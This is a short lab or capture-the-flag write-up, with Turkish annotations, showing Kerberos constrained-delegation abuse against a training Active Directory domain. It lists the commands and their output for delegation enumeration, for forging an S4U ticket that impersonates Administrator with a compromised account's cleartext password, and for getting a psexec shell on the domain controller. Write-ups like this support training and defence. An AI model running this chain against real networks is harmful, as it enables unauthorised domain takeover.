# Constrained Delegation from Linux

## Hosts File

```sh
my@attack:~$ echo "10.129.100.233 inlanefreight.local dc01.inlanefreight.local" | sudo tee -a /etc/hosts
```

## Enumeration

```sh
my@attack:~$ findDelegation.py 'INLANEFREIGHT.LOCAL'/'carole.rose':'jasmine'
```

```output title="Output" hl_lines="4"
AccountName    AccountType  DelegationType                      DelegationRightsTo                SPN Exists
-------------  -----------  ----------------------------------  --------------------------------  ----------
callum.dixon   Person       Unconstrained                       N/A                               No
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01.INLANEFREIGHT.LOCAL  Yes
beth.richards  Person       Constrained w/ Protocol Transition  TERMSRV/DC01                      Yes
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01.INLANEFREIGHT.LOCAL      No
DMZ01$         Computer     Constrained w/ Protocol Transition  www/WS01                          No
SQL01$         Computer     Unconstrained                       N/A                               Yes
```

## Crafting a TGS Ticket

!!! warning

    Beth Richards hesabı daha önceden ele geçirildi.

```sh
my@attack:~$ getST.py 'INLANEFREIGHT.LOCAL'/'beth.richards':'B3thR!ch@rd$' -impersonate Administrator -spn termsrv/DC01.INLANEFREIGHT.LOCAL
```

```output title="Output" hl_lines="6"
[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@termsrv_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache
```

## Using the Ticket

!!! success

    * Impacket CIFS adını bulmayı dener ve başarısız olur.
    * SPN korumalı bir yapı değildir.
    * Impacket [AnySPN](https://www.thehacker.recipes/ad/movement/kerberos/ptt#modifying-the-spn) tekniğini kullanarak TERMSRV adını CIFS adı ile değiştirir.

```sh
my@attack:~$ export KRB5CCNAME='Administrator@termsrv_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache'
my@attack:~$ psexec.py 'INLANEFREIGHT.LOCAL'/'Administrator'@DC01.INLANEFREIGHT.LOCAL -k -no-pass -debug
```
